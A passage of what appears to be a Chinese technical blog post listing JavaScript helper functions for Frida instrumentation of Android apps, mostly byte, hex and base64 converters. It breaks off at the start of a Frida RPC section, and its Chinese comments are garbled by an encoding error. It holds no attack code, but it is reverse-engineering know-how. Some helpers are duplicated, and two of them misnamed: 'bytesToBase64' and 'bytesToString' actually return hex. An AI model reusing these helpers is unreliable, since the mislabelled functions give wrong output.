+= base64EncodeChars.<span class="title function_">charAt</span>(h &gt;&gt; <span class="number">2</span>),</span><br><span class="line">            r += base64EncodeChars.<span class="title function_">charAt</span>((<span class="number">3</span> &amp; h) &lt;&lt; <span class="number">4</span> | (<span class="number">240</span> &amp; o) &gt;&gt; <span class="number">4</span>),</span><br><span class="line">            r += base64EncodeChars.<span class="title function_">charAt</span>((<span class="number">15</span> &amp; o) &lt;&lt; <span class="number">2</span> | (<span class="number">192</span> &amp; t) &gt;&gt; <span class="number">6</span>),</span><br><span class="line">            r += base64EncodeChars.<span class="title function_">charAt</span>(<span class="number">63</span> &amp; t)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">base64ToString</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> r, a, c, h, o, t, d;</span><br><span class="line">    <span class="keyword">for</span> (t = e.<span class="property">length</span>, o = <span class="number">0</span>, d = <span class="string">&#x27;&#x27;</span>; o &lt; t;) &#123;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">            r = base64DecodeChars[<span class="number">255</span> &amp; e.<span class="title function_">charCodeAt</span>(o++)];</span><br><span class="line">        <span class="keyword">while</span> (o &lt; t &amp;&amp; r == -<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (r == -<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">            a = base64DecodeChars[<span class="number">255</span> &amp; e.<span class="title function_">charCodeAt</span>(o++)];</span><br><span class="line">        <span class="keyword">while</span> (o &lt; t &amp;&amp; a == -<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (a == -<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        d += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(r &lt;&lt; <span class="number">2</span> | (<span class="number">48</span> &amp; a) &gt;&gt; <span class="number">4</span>);</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (c = <span class="number">255</span> &amp; e.<span class="title function_">charCodeAt</span>(o++), <span class="number">61</span> == c)</span><br><span class="line">                <span class="keyword">return</span> d;</span><br><span class="line">            c = base64DecodeChars[c]</span><br><span class="line">        &#125; <span class="keyword">while</span> (o &lt; t &amp;&amp; c == -<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (c == -<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        d += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>((<span class="number">15</span> &amp; a) &lt;&lt; <span class="number">4</span> | (<span class="number">60</span> &amp; c) &gt;&gt; <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (h = <span class="number">255</span> &amp; e.<span class="title function_">charCodeAt</span>(o++), <span class="number">61</span> == h)</span><br><span class="line">                <span class="keyword">return</span> d;</span><br><span class="line">            h = base64DecodeChars[h]</span><br><span class="line">        &#125; <span class="keyword">while</span> (o &lt; t &amp;&amp; h == -<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (h == -<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        d += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>((<span class="number">3</span> &amp; c) &lt;&lt; <span class="number">6</span> | h)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> d</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hexToBase64</span>(<span class="params">str</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">base64Encode</span>(<span class="title class_">String</span>.<span class="property">fromCharCode</span>.<span class="title function_">apply</span>(<span class="literal">null</span>, str.<span class="title function_">replace</span>(<span class="regexp">/\r|\n/g</span>, <span class="string">&quot;&quot;</span>).<span class="title function_">replace</span>(<span class="regexp">/([\da-fA-F]&#123;2&#125;) ?/g</span>, <span class="string">&quot;0x$1 &quot;</span>).<span class="title function_">replace</span>(<span class="regexp">/ +$/</span>, <span class="string">&quot;&quot;</span>).<span class="title function_">split</span>(<span class="string">&quot; &quot;</span>)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">base64ToHex</span>(<span class="params">str</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>, bin = <span class="title function_">base64Decode</span>(str.<span class="title function_">replace</span>(<span class="regexp">/[ \r\n]+$/</span>, <span class="string">&quot;&quot;</span>)), hex = []; i &lt; bin.<span class="property">length</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">var</span> tmp = bin.<span class="title function_">charCodeAt</span>(i).<span class="title function_">toString</span>(<span class="number">16</span>);</span><br><span class="line">        <span class="keyword">if</span> (tmp.<span class="property">length</span> === <span class="number">1</span>)</span><br><span class="line">            tmp = <span class="string">&quot;0&quot;</span> + tmp;</span><br><span class="line">        hex[hex.<span class="property">length</span>] = tmp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> hex.<span class="title function_">join</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hexToBytes</span>(<span class="params">str</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> pos = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">var</span> len = str.<span class="property">length</span>;</span><br><span class="line">    <span class="keyword">if</span> (len % <span class="number">2</span> != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    len /= <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">var</span> hexA = <span class="keyword">new</span> <span class="title class_">Array</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> s = str.<span class="title function_">substr</span>(pos, <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">var</span> v = <span class="built_in">parseInt</span>(s, <span class="number">16</span>);</span><br><span class="line">        hexA.<span class="title function_">push</span>(v);</span><br><span class="line">        pos += <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> hexA;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">bytesToHex</span>(<span class="params">arr</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> str = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">var</span> k, j;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arr.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        k = arr[i];</span><br><span class="line">        j = k;</span><br><span class="line">        <span class="keyword">if</span> (k &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            j = k + <span class="number">256</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (j &lt; <span class="number">16</span>) &#123;</span><br><span class="line">            str += <span class="string">&quot;0&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        str += j.<span class="title function_">toString</span>(<span class="number">16</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">stringToHex</span>(<span class="params">str</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> val = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; str.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (val == <span class="string">&quot;&quot;</span>)</span><br><span class="line">            val = str.<span class="title function_">charCodeAt</span>(i).<span class="title function_">toString</span>(<span class="number">16</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            val += str.<span class="title function_">charCodeAt</span>(i).<span class="title function_">toString</span>(<span class="number">16</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> val</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">stringToBytes</span>(<span class="params">str</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> ch, st, re = [];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; str.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        ch = str.<span class="title function_">charCodeAt</span>(i);</span><br><span class="line">        st = [];</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            st.<span class="title function_">push</span>(ch &amp; <span class="number">0xFF</span>);</span><br><span class="line">            ch = ch &gt;&gt; <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (ch);</span><br><span class="line">        re = re.<span class="title function_">concat</span>(st.<span class="title function_">reverse</span>());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> re;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å°†byte[]è½¬æˆStringçš„æ–¹æ³•</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">bytesToString</span>(<span class="params">arr</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> str = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    arr = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>(arr);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i <span class="keyword">in</span> arr) &#123;</span><br><span class="line">        str += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(arr[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">bytesToBase64</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> r, a, c, h, o, t;</span><br><span class="line">    <span class="keyword">for</span> (c = e.<span class="property">length</span>, a = <span class="number">0</span>, r = <span class="string">&#x27;&#x27;</span>; a &lt; c;) &#123;</span><br><span class="line">        <span class="keyword">if</span> (h = <span class="number">255</span> &amp; e[a++], a == c) &#123;</span><br><span class="line">            r += base64EncodeChars.<span class="title function_">charAt</span>(h &gt;&gt; <span class="number">2</span>),</span><br><span class="line">                r += base64EncodeChars.<span class="title function_">charAt</span>((<span class="number">3</span> &amp; h) &lt;&lt; <span class="number">4</span>),</span><br><span class="line">                r += <span class="string">&#x27;==&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (o = e[a++], a == c) &#123;</span><br><span class="line">            r += base64EncodeChars.<span class="title function_">charAt</span>(h &gt;&gt; <span class="number">2</span>),</span><br><span class="line">                r += base64EncodeChars.<span class="title function_">charAt</span>((<span class="number">3</span> &amp; h) &lt;&lt; <span class="number">4</span> | (<span class="number">240</span> &amp; o) &gt;&gt; <span class="number">4</span>),</span><br><span class="line">                r += base64EncodeChars.<span class="title function_">charAt</span>((<span class="number">15</span> &amp; o) &lt;&lt; <span class="number">2</span>),</span><br><span class="line">                r += <span class="string">&#x27;=&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        &#125;</span><br><span class="line">        t = e[a++],</span><br><span class="line">            r += base64EncodeChars.<span class="title function_">charAt</span>(h &gt;&gt; <span class="number">2</span>),</span><br><span class="line">            r += base64EncodeChars.<span class="title function_">charAt</span>((<span class="number">3</span> &amp; h) &lt;&lt; <span class="number">4</span> | (<span class="number">240</span> &amp; o) &gt;&gt; <span class="number">4</span>),</span><br><span class="line">            r += base64EncodeChars.<span class="title function_">charAt</span>((<span class="number">15</span> &amp; o) &lt;&lt; <span class="number">2</span> | (<span class="number">192</span> &amp; t) &gt;&gt; <span class="number">6</span>),</span><br><span class="line">            r += base64EncodeChars.<span class="title function_">charAt</span>(<span class="number">63</span> &amp; t)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">base64ToBytes</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> r, a, c, h, o, t, d;</span><br><span class="line">    <span class="keyword">for</span> (t = e.<span class="property">length</span>, o = <span class="number">0</span>, d = []; o &lt; t;) &#123;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">            r = base64DecodeChars[<span class="number">255</span> &amp; e.<span class="title function_">charCodeAt</span>(o++)];</span><br><span class="line">        <span class="keyword">while</span> (o &lt; t &amp;&amp; r == -<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (r == -<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">            a = base64DecodeChars[<span class="number">255</span> &amp; e.<span class="title function_">charCodeAt</span>(o++)];</span><br><span class="line">        <span class="keyword">while</span> (o &lt; t &amp;&amp; a == -<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (a == -<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        d.<span class="title function_">push</span>(r &lt;&lt; <span class="number">2</span> | (<span class="number">48</span> &amp; a) &gt;&gt; <span class="number">4</span>);</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (c = <span class="number">255</span> &amp; e.<span class="title function_">charCodeAt</span>(o++), <span class="number">61</span> == c)</span><br><span class="line">                <span class="keyword">return</span> d;</span><br><span class="line">            c = base64DecodeChars[c]</span><br><span class="line">        &#125; <span class="keyword">while</span> (o &lt; t &amp;&amp; c == -<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (c == -<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        d.<span class="title function_">push</span>((<span class="number">15</span> &amp; a) &lt;&lt; <span class="number">4</span> | (<span class="number">60</span> &amp; c) &gt;&gt; <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (h = <span class="number">255</span> &amp; e.<span class="title function_">charCodeAt</span>(o++), <span class="number">61</span> == h)</span><br><span class="line">                <span class="keyword">return</span> d;</span><br><span class="line">            h = base64DecodeChars[h]</span><br><span class="line">        &#125; <span class="keyword">while</span> (o &lt; t &amp;&amp; h == -<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (h == -<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        d.<span class="title function_">push</span>((<span class="number">3</span> &amp; c) &lt;&lt; <span class="number">6</span> | h)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> d</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// æ‰“å°log</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">showStacks</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="title function_">send</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.util.Log&quot;</span>).<span class="title function_">getStackTraceString</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Exception&quot;</span>).$new()));</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å­—èŠ‚æ•°ç»„è½¬hexå­—ç¬¦ä¸²</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">bytesToHex</span>(<span class="params">arr</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> str = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arr.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> tmp = arr[i];</span><br><span class="line">        <span class="keyword">if</span> (tmp &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            tmp = (<span class="number">255</span> + tmp + <span class="number">1</span>).<span class="title function_">toString</span>(<span class="number">16</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            tmp = tmp.<span class="title function_">toString</span>(<span class="number">16</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (tmp.<span class="property">length</span> == <span class="number">1</span>) &#123;</span><br><span class="line">            tmp = <span class="string">&quot;0&quot;</span> + tmp;</span><br><span class="line">        &#125;</span><br><span class="line">        str += tmp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">bytesToBase64</span>(<span class="params">arr</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> str = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arr.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> tmp = arr[i];</span><br><span class="line">        <span class="keyword">if</span> (tmp &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            tmp = (<span class="number">255</span> + tmp + <span class="number">1</span>).<span class="title function_">toString</span>(<span class="number">16</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            tmp = tmp.<span class="title function_">toString</span>(<span class="number">16</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (tmp.<span class="property">length</span> == <span class="number">1</span>) &#123;</span><br><span class="line">            tmp = <span class="string">&quot;0&quot;</span> + tmp;</span><br><span class="line">        &#125;</span><br><span class="line">        str += tmp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">bytesToString</span>(<span class="params">arr</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> str = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arr.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> tmp = arr[i];</span><br><span class="line">        <span class="keyword">if</span> (tmp &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            tmp = (<span class="number">255</span> + tmp + <span class="number">1</span>).<span class="title function_">toString</span>(<span class="number">16</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            tmp = tmp.<span class="title function_">toString</span>(<span class="number">16</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (tmp.<span class="property">length</span> == <span class="number">1</span>) &#123;</span><br><span class="line">            tmp = <span class="string">&quot;0&quot;</span> + tmp;</span><br><span class="line">        &#125;</span><br><span class="line">        str += tmp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> str;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">byteToHexString</span>(<span class="params">uint8arr</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!uint8arr) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> hexStr = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; uint8arr.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> hex = (uint8arr[i] &amp; <span class="number">0xff</span>).<span class="title function_">toString</span>(<span class="number">16</span>);</span><br><span class="line">        hex = (hex.<span class="property">length</span> === <span class="number">1</span>) ? <span class="string">&#x27;0&#x27;</span> + hex : hex;</span><br><span class="line">        hexStr += hex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> hexStr.<span class="title function_">toUpperCase</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">stringToUint8Array</span>(<span class="params">str</span>)&#123;</span><br><span class="line">  <span class="keyword">var</span> arr = [];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>, j = str.<span class="property">length</span>; i &lt; j; ++i) &#123;</span><br><span class="line">    arr.<span class="title function_">push</span>(str.<span class="title function_">charCodeAt</span>(i));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> tmpUint8Array = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>(arr);</span><br><span class="line">  <span class="keyword">return</span> tmpUint8Array</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">str2arraybffer</span>(<span class="params">str</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> buf = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(str.<span class="property">length</span> * <span class="number">2</span>); <span class="comment">// æ¯ä¸ªå­—ç¬¦å ç”¨2ä¸ªå­—èŠ‚</span></span><br><span class="line">    <span class="keyword">var</span> bufView = <span class="keyword">new</span> <span class="title class_">Uint16Array</span>(buf);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>, strLen = str.<span class="property">length</span>; i &lt; strLen; i++) &#123;</span><br><span class="line">        bufView[i] = str.<span class="title function_">charCodeAt</span>(i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> buf;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">printBytes</span>(<span class="params">b</span>)&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> hexstr = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>; i&lt; b.<span class="property">length</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">var</span> uByte = (b[i]&gt;&gt;&gt;<span class="number">0</span>)&amp;<span class="number">0xff</span>;</span><br><span class="line">        <span class="keyword">var</span> n = uByte.<span class="title function_">toString</span>(<span class="number">16</span>);</span><br><span class="line">        hexstr += <span class="string">&quot;0x&quot;</span> + (<span class="string">&quot;00&quot;</span> + n).<span class="title function_">slice</span>(-<span class="number">2</span>)+<span class="string">&quot;, &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> hexstr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å­—èŠ‚æ•°ç»„è½¬åå…­è¿›åˆ¶å­—ç¬¦ä¸²ï¼Œå¯¹è´Ÿå€¼å¡«å‘</span></span><br><span class="line"><span class="comment">// äºŒè¿›åˆ¶æ•°æ®ï¼ˆåŒ…æ‹¬å†…å­˜åœ°å€ï¼‰åœ¨è®¡ç®—æœºä¸­ä¸€èˆ¬ä»¥16è¿›åˆ¶çš„æ–¹å¼è¡¨ç¤º</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Bytes2HexString</span>(<span class="params">arrBytes</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> str = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arrBytes.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> tmp;</span><br><span class="line">        <span class="keyword">var</span> num=arrBytes[i];</span><br><span class="line">        <span class="keyword">if</span> (num &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">//æ­¤å¤„å¡«å‘ï¼Œå½“byteå› ä¸ºç¬¦åˆä½å¯¼è‡´æ•°å€¼ä¸ºè´Ÿæ—¶å€™ï¼Œéœ€è¦å¯¹æ•°æ®è¿›è¡Œå¤„ç†</span></span><br><span class="line">            tmp =(<span class="number">255</span>+num+<span class="number">1</span>).<span class="title function_">toString</span>(<span class="number">16</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            tmp = num.<span class="title function_">toString</span>(<span class="number">16</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (tmp.<span class="property">length</span> == <span class="number">1</span>) &#123;</span><br><span class="line">            tmp = <span class="string">&quot;0&quot;</span> + tmp;</span><br><span class="line">        &#125;</span><br><span class="line">        str += tmp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä¼šè½¬æˆæœ‰ç¬¦å·çš„æ•°å­—  JSON.stringify(bytes)</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">HexString2Bytes</span>(<span class="params">str</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> pos = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">var</span> len = str.<span class="property">length</span>;</span><br><span class="line">    <span class="keyword">if</span> (len % <span class="number">2</span> != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    len /= <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">var</span> arrBytes = <span class="keyword">new</span> <span class="title class_">Array</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> s = str.<span class="title function_">substr</span>(pos, <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">var</span> v = <span class="built_in">parseInt</span>(s, <span class="number">16</span>);</span><br><span class="line"><span class="comment">// è½¬æˆæœ‰ç¬¦å·çš„ 10è¿›åˆ¶</span></span><br><span class="line"><span class="keyword">if</span> (v &gt; <span class="number">127</span>) &#123; v = v - <span class="number">256</span> &#125;</span><br><span class="line"><span class="comment">// end</span></span><br><span class="line">        arrBytes.<span class="title function_">push</span>(v);</span><br><span class="line">        pos += <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> arrBytes;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">jstring2Str</span>(<span class="params">jstring</span>) &#123;</span><br><span class="line">   <span class="keyword">var</span> ret;</span><br><span class="line">   <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">       <span class="keyword">var</span> <span class="title class_">String</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.String&quot;</span>);</span><br><span class="line">       ret = <span class="title class_">Java</span>.<span class="title function_">cast</span>(jstring, <span class="title class_">String</span>);</span><br><span class="line">   &#125;);</span><br><span class="line">   <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">function</span> <span class="title function_">jbyteArray2Array</span>(<span class="params">jbyteArray</span>) &#123;</span><br><span class="line">   <span class="keyword">var</span> ret;</span><br><span class="line">   <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">       <span class="keyword">var</span> b = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;[B&#x27;</span>);</span><br><span class="line">       <span class="keyword">var</span> buffer = <span class="title class_">Java</span>.<span class="title function_">cast</span>(jbyteArray, b);</span><br><span class="line">       ret = <span class="title class_">Java</span>.<span class="title function_">array</span>(<span class="string">&#x27;byte&#x27;</span>, buffer);</span><br><span class="line">   &#125;);</span><br><span class="line">   <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getParamType</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> obj == <span class="literal">null</span> ? <span class="title class_">String</span>(obj) : <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">toString</span>.<span class="title function_">call</span>(obj).<span class="title function_">replace</span>(<span class="regexp">/\[object\s+(\w+)\]/i</span>, <span class="string">&quot;$1&quot;</span>) || <span class="string">&quot;object&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="0x03-Frida-RPC"><a href="#0x03-Frida-RPC" class="headerlink" title="0x03 Frida RPC"></a>0x03 Frida RPC</h1><h2 id="RPCä¸»åŠ¨è°ƒç”¨"><a href="#RPCä¸»åŠ¨è°ƒç”¨" class="headerlink" title="RPCä¸»åŠ¨è°ƒç”¨"></a>RPCä¸»åŠ¨è°ƒç”¨</h2><p><strong>rpc.exportså¯¼å‡ºåä¸å¯ä»¥æœ‰å¤§å†™å­—æ¯æˆ–è€…ä¸‹åˆ’çº¿</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">invoke</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title 